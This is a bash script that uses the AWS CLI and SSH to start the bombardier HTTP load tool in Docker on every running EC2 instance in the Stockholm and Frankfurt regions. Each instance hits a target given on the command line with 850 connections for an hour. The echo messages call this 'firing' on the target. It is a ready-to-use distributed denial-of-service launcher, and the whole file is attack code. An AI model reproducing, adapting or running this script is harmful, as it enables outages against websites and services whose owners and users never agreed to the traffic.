#!/bin/bash

# Fill the list of IPs of online AWS instances, e.g.:
# STOCKHOLM=('1.2.3.4' '5.6.7.8' '9.10.11.12')
# FRANKFURT=('1.2.3.4' '5.6.7.8' '9.10.11.12')
# OR leave empy for fire on all yuout running instances

STOCKHOLM=()
FRANKFURT=()

main(){
	if [ ${#STOCKHOLM[@]} -eq 0  ]
	then
	    echo "Stockholm fires on $1 list"
	    fire "key-stockholm-1.pem" ${1} $(list "eu-north-1")
	else
	    echo "Stockholm fires on $1"
	    fire "key-stockholm-1.pem" ${1} "${STOCKHOLM[@]}"
	fi

	if [ ${#FRANKFURT[@]} -eq 0  ]
	then
	    echo "Frankfurt fires on $1 list"
	    fire "key-frankfurt-1.pem" ${1} $(list "eu-central-1")
	else
	    echo "Frankfurt fires on $1"
	    fire "key-frankfurt-1.pem" ${1} "${FRANKFURT[@]}"
	fi
}

fire(){
	local key=${1}
	local target=${2}
	shift 2

	for ip in ${@}
	do
		echo "Fire on ${target} by ${ip}"
		ssh -i "${key}" -o "StrictHostKeyChecking no" "ubuntu@${ip}" screen -dm sudo docker run -ti --rm alpine/bombardier -c 850 -d 3600s -l ${target}
	done
}

function list(){
    aws ec2 describe-instances \
	--region ${1} \
	--query "Reservations[*].Instances[*].{slava:PublicIpAddress}" \
	--filters "Name=instance-state-code,Values=16" \
	--output=text
}

./checkAWS.sh && main ${@} || ./awsCliNa.sh
